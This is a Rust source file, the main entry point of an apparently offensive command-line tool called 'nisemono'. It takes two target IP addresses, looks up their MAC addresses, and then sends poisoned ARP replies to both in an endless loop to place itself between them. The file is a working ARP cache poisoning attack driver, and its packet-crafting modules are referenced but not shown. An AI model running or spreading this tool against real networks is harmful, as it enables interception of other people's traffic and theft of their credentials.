mod net;
mod ui;
use ansi_term::Color;
use net::arp::*;
use net::*;
use std::env::args;
use std::{thread, time};

fn main() {
    ui::print_banner();

    if args().len() == 3 {
        let target_a_ip = args().nth(1).unwrap();
        let target_b_ip = args().nth(2).unwrap();

        if utils::is_valid(&target_a_ip) && utils::is_valid(&target_b_ip) {
            match utils::build_socket() {
                Ok(mut socket) => {
                    let target_a_ip = utils::parse_ip(&target_a_ip);
                    let target_b_ip = utils::parse_ip(&target_b_ip);

                    println!("\n{}", Color::Green.bold().paint("getting targets MAC addresses ..."));
                    request::send(&mut socket, &target_a_ip);
                    let target_a_mac = request::get_target_mac(&mut socket, &target_a_ip);
                    request::send(&mut socket, &target_b_ip);
                    let target_b_mac = request::get_target_mac(&mut socket, &target_b_ip);
                    println!("{}\n", Color::Green.paint("done!"));

                    println!("{}", Color::Red.bold().paint("starting the ARP cache poisoning ..."));
                    loop {
                        println!("{}", Color::Red.paint("sending poisoned ARP replies to the targets"));
                        reply::send(&mut socket, &target_a_ip, &target_a_mac, &target_b_ip);
                        reply::send(&mut socket, &target_b_ip, &target_b_mac, &target_a_ip);

                        thread::sleep(time::Duration::from_secs(5));
                    }
                }
                Err(e) => eprintln!("{}", e),
            }
        } else {
            eprintln!("invalid IP address");
        }
    } else {
        eprintln!("usage : sudo ./nisemono <target_IP> <other_target_IP>");
    }
}
